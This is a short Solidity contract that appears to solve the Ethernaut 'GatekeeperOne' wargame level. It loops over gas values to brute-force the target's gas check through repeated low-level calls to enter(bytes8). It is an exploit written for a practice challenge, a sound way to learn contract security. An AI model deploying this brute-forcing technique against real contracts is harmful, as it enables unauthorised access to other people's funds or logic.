// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    GatekeeperOne gkoContract;
    constructor(address _target){
        gkoContract = GatekeeperOne(_target);
    }

    function attack(bytes8 _gateKey) public returns (bool) {
        bool result;

        for(uint cnt = 0; cnt <= 8191; cnt++){
            (result, ) = address(gkoContract).call{gas:cnt + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));

            if (result == true)
                break;
        }

        return result;
    }
}
